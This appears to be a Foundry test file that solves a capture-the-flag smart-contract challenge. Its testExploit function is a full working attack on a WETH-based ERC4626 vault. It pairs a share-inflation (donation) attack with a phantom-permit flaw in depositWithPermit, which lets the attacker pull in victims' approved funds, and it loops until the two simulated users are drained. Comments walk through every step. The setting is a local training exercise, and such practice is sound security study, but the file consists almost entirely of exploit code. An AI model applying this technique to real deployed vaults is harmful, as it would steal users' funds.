// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {WETH} from "../src/5_balloon-vault/WETH.sol";
import {BallonVault} from "../src/5_balloon-vault/Vault.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge5Test is Test {
    BallonVault public vault;
    WETH public weth = new WETH();

    address public attacker = makeAddr("attacker");
    address public bob = makeAddr("bob");
    address public alice = makeAddr("alice");

    function setUp() public {
        vault = new BallonVault(address(weth));

        // Attacker starts with 10 ether
        vm.deal(address(attacker), 10 ether);

        // Set up Bob and Alice with 500 WETH each
        weth.deposit{value: 1000 ether}();
        weth.transfer(bob, 500 ether);
        weth.transfer(alice, 500 ether);

        vm.prank(bob);
        weth.approve(address(vault), 500 ether);
        vm.prank(alice);
        weth.approve(address(vault), 500 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge5Test -vvvv //
        ////////////////////////////////////////////////////*/

        weth.deposit{value: 10 ether}();
        weth.approve(address(vault), type(uint256).max);

        // @audit We will use the inflation attack on the ERC4626 vault
        // eg. the attacker does the first deposit on the vault of 1 wei to get 1 share. 
        // attacker donates 1000 ether to the vault.
        // since we have 1 share and the vault has 1000 ether + 1 wei that will be the value of 1 share.
        // If the victim deposits 1000 ether he will get 0 shares.
        // we then redeem the 1 share to get 2000 ether + 1 wei, stealing the 1000 ether from the victim.

        // Step 1. the victims approved the vault to spend 500 ether each. we need to move the victim funds to the vault. 
        // this can be done because there is a shadow function in vault.sol inside depositWithPermit(). 
        // If we it will try to use permit on WETH, that does not have that function, going thru the fallback function. and succeding silently.
        // then it will do an arbitrary deposit of the parameterized address. We call it with the victim address and the ammount we want to deposit to use the allowed funds.

        uint256 amountToSteal;

        for (; weth.balanceOf(bob) != 0;) {
            // deposit 1 wei, first deposit, one share.
            vault.deposit(1 wei, attacker);
            amountToSteal = weth.balanceOf(address(attacker));

            // if our current balance is bigger than what we can steal from the victim. set victim balance to amount to steal.
            if (amountToSteal > weth.balanceOf(bob)) {
                amountToSteal = weth.balanceOf(bob);
            }

            // donate the amountToSteal to the vault
            weth.transfer(address(vault), amountToSteal);
            // use the approval to deposit the amountToSteal to the vault. the shadow function will be a no-op.
            vault.depositWithPermit(bob, amountToSteal, 0, 0, 0, 0);
            // redeem our share valued at our deposit and donation + victim forced deposit.
            vault.redeem(vault.balanceOf(attacker), attacker, attacker);

            console.log("balance of attacker: %s", weth.balanceOf(address(attacker)));
            console.log("balance of bob: %s", weth.balanceOf(address(bob)));
        }

        for (; weth.balanceOf(alice) != 0;) {
            vault.deposit(1 wei, attacker);
            amountToSteal = weth.balanceOf(address(attacker));

            if (amountToSteal > weth.balanceOf(alice)) {
                amountToSteal = weth.balanceOf(alice);
            }

            weth.transfer(address(vault), amountToSteal);
            vault.depositWithPermit(alice, amountToSteal, 0, 0, 0, 0);
            vault.redeem(vault.balanceOf(attacker), attacker, attacker);

            console.log("balance of attacker: %s", weth.balanceOf(address(attacker)));
            console.log("balance of alice: %s", weth.balanceOf(address(bob)));
        }

        // remove our max approval after the hack is done.
        weth.approve(address(vault), 0);

        //==================================================//
        vm.stopPrank();

        assertGt(weth.balanceOf(address(attacker)), 1000 ether, "Attacker should have more than 1000 ether");
    }
}
